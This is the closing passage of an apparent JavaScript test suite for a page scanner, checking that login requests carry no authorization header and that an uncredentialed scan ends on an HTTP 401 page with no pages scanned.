      expect(loginRequests.length).toBeGreaterThan(0);
      expect(
        loginRequests.map((request) => request.headers.authorization),
      ).toEqual(loginRequests.map(() => undefined));
      // Without credentials the redirect target stays an HTTP 401 page.
      expect(scan.pagesScanned).toBe(0);
      expect(scan.pagesFailed).toBe(1);
    });
  });
});
